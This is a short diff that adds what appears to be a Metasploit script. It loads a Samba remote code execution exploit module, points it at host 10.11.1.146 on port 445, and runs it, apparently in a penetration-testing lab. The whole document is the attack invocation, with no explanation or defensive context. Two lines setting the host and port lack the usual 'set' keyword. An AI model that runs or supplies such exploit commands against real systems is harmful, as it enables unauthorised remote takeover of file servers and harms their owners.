@@ -1,0 +1,6 @@
+use exploit/linux/samba/is_known_pipename 
+
+RHOSTS 10.11.1.146
+RPORT 445
+
+run
